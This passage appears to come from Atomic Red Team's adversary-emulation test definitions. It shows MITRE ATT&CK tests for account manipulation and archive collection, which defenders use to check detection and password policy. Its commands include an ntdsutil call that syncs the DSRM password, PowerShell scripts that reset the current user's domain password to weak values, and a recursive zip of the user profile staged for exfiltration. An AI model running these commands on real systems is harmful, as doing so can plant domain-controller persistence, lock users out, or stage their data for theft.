Description: Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account

Attack Commands:
Executor: command_prompt
ElevationRequired: True
Command:
ntdsutil "set dsrm password" "sync from domain account #{sync_account}" "q" "q"
Command (with inputs):
ntdsutil "set dsrm password" "sync from domain account %username%" "q" "q"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: Short Password
Atomic Test Number: 10
Atomic Test GUID: fc5f9414-bd67-4f5f-a08e-e5381e29cbd1
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can th
en run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "Uplow-1"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to Uplow-1"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "Uplow-1" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: No Number in Password
Atomic Test Number: 11
Atomic Test GUID: 68190529-069b-4ffc-a942-919704158065
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "UpperLowerLong-special"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to UpperLowerLong-special"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "UpperLowerLong-special" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: No Special Character in Password
Atomic Test Number: 12
Atomic Test GUID: 7d984ef2-2db2-4cec-b090-e637e1698f61
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "UpperLowerLong333noSpecialChar"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to UpperLowerLong333noSpecialChar"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "UpperLowerLong333noSpecialChar" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: No Uppercase Character in Password
Atomic Test Number: 13
Atomic Test GUID: b299c120-44a7-4d68-b8e2-8ba5a28511ec
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "lower-long-special-333"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to lower-long-special-333"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "lower-long-special-333" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: No Lowercase Character in Password
Atomic Test Number: 14
Atomic Test GUID: 945da11e-977e-4dab-85d2-f394d03c5887
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "UPPER-LONG-SPECIAL-333"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to UPPER-LONG-SPECIAL-333"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "UPPER-LONG-SPECIAL-333" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: Only Two Character Classes
Atomic Test Number: 15
Atomic Test GUID: 784d1349-5a26-4d20-af5e-d6af53bae460
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "onlyUPandLowChars"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to onlyUPandLowChars"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "onlyUPandLowChars" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: Account Manipulation T1098
Atomic Test Name: Domain Password Policy Check: Common Password Use
Atomic Test Number: 16
Atomic Test GUID: 81959d03-c51f-49a1-bb24-23f1ec885578
Description: Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password po
licy is blocking the use of the new password. If the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can the
n run the atomic manually and specify a new password of your choosing, however the password policy will likely prevent you from setting the password back to what it was.

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
$credFile = "#{cred_file}"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}
Command (with inputs):
$credFile = "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
if (Test-Path $credFile) {
    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)
    if($cred.GetNetworkCredential().Password -eq "Spring$((Get-Date).Year)!"){
      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1
    }
    try {
        $newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force
        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword
    }
    catch { 
        $_.Exception
        $errCode = $_.Exception.ErrorCode
        Write-Host "Error code: $errCode"
        if ($errCode -eq 86) {
            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials"
            Remove-Item $credFile
        }
        exit $errCode
    }
    Write-Host -ForegroundColor Cyan "Successfully changed the password to Spring$((Get-Date).Year)!"
    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "Spring$((Get-Date).Year)!" -AsPlainText -Force))
    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile
}
else {
    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"
}

Dependencies:
Description: Password for current user must be stored in a credential file
Check Prereq Command:
if (Test-Path #{cred_file}) {exit 0} else {exit 1}
Check Prereq Command (with inputs):
if (Test-Path $env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt) {exit 0} else {exit 1}
Get Prereq Command:
New-Item -Type Directory (split-path "#{cred_file}") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "#{cred_file}"
Get Prereq Command (with inputs):
New-Item -Type Directory (split-path "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null
$cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"
$cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\AtomicRedTeam\$env:USERNAME.txt"
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Archive Collected Data T1560
Atomic Test Name: Compress Data for Exfiltration With PowerShell
Atomic Test Number: 1
Atomic Test GUID: 41410c60-614d-4b9d-b66e-b0192dd9c597
Description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. When the test completes you should find the files from the $env:USERP
ROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
Command (with inputs):
dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip

Cleanup Commands:
Command:
Remove-Item -path #{output_file} -ErrorAction Ignore
Command (with inputs):
Remove-Item -path $env:USERPROFILE\T1560-data-ps.zip -ErrorAction Ignore
[!!!!!!!!END TEST!!!!!!!]


PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: Archive Collected Data: Archive via Utility T1560.001
Atomic Test Name: Compress Data for Exfiltration With Rar
Atomic Test Number: 1
Atomic Test GUID: 02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0
Description: An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. When the test completes you should find the txt files from the %USERP
